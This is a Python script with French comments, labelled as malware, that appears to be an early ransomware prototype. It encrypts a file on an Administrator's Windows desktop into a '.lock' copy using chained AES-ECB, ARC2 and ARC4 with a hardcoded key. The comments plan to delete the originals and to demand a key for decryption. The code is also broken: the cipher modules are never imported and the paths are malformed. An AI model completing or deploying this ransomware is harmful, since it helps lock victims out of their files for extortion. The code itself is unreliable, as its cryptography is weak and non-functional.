#malware

#Chiffrer un repertoire present sur le bureau, avec crypto
#tableau d'extension 
#lire le fichier, prendre le contenu, le chiffrer, supprimer le fichier et en creer un nouveau avec le contneu chiffrer
#Machine KALI fourni une clef aleatoirement pour chiffrer/dechiffrer
#prompte "Renseigner la clef pour dechiffrer"


import Crypto, sys
from cryptography.fernet import Fernet

#Variables
directory = "C:\Users\Administrateur\Desktop\docchiffres"
original_filename = "C:\Users\Administrateur\Desktop\docchiffres\a.txt"
destination_filename = "C:\Users\Administrateur\Desktop\docchiffres\a.txt.lock"
Key="1a3b4c5e6d7f8g9h0i1j2k3l4m5n6o7p"


####definition pour le cryptage
def crypt( message, Key):
	if len(message)==0:
		return ""
	else:
		AESobj=AES.new(Key,AES.MODE_ECB) 	
		ARC2obj=ARC2.new(Key + Key ) 
		ARC4obj=ARC4.new(Key + Key + Key) 
		m3=ARC4obj.encrypt(ARC2obj.encrypt(AESobj.encrypt(message)))			
		return m3


####defintion pour le decryptage
def decrypt( message, Key):
	if len(message)== 0:
		return ""
	else:
		AESobj=AES.new(Key,AES.MODE_ECB)
		ARC2obj=ARC2.new(Key + Key )
		ARC4obj=ARC4.new(Key + Key + Key)
		m3=AESobj.decrypt(ARC2obj.decrypt(ARC4obj.decrypt(message)))	
		return m3



####fonction de cryptage pour un fichier		
def cryptfile(original_filename, Key , destination_filename): 
	line_file= ""
	FILE_O = open(original_filename,"r")
	FILE_D = open(destination_filename,"w")	
	for line in FILE_O:
		line_file= line_file + line		
	crypt_line=crypt(line_file,Key)		
	FILE_D.writelines(crypt_line)
	FILE_O.close()
	FILE_D.close()	

#fonctionde decryptage pour un fichier
def decryptfile(original_filename, Key, destination_filename):
	line_file= ""
	FILE_O = open(original_filename,"r")
	FILE_D = open(destination_filename,"w")	
	for line in FILE_O:
		line_file= line_file + line				
	crypt_line=decrypt(line_file,Key)			
	FILE_D.writelines(crypt_line)
	FILE_O.close()
	FILE_D.close()    

#fonction main
if sys.argv[1] in ["c","C","Crypt","CRYPT"]:
	cryptfile(original_filename, Key, destination_filename)
else:	
	decryptfile(original_filename, Key, destination_filename)
